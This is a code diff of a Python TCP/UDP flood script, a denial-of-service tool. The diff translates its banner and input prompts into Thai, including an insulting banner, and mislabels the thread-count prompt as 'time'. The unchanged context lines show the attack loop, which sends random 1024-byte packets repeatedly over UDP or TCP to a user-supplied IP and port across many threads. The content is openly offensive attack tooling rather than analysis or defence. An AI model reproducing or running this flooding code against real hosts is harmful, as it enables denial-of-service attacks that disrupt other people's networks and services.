@@ -5,13 +5,13 @@ import socket
 import threading
 
 print("###########################")
-print("###### TCP/UDP FLOOD ######")
+print("###### ยิงเน็ตไอ้กากต่อ ######")
 print("###########################")
-ip = str(input(" HOST/IP:"))
-port = int(input(" PORT:"))
-choice = str(input(" UDP(Y/N):"))	
-times = int(input(" PACKETS PER ONE CONNECTION:"))
-threads = int(input(" THREADS:"))
+ip = str(input(" ไอพี:"))
+port = int(input(" พอร์ต:"))
+choice = str(input(" ใส่(Y):"))	
+times = int(input(" จำนวน:"))
+threads = int(input(" เวลา:"))
 def run():
 	data = random._urandom(1024)
 	i = random.choice(("[*]","[!]","[#]"))
@@ -21,7 +21,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" ATTACK!!!")
+			print(i +" ยิงแล้ว!!!")
 		except:
 			print("[!] ERROR!!!")
 			
@@ -35,7 +35,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" ATTACK!!!")
+			print(i +" ยิงแล้ว!!!")
 		except:
 			s.close()
 			print("[*] ERROR")
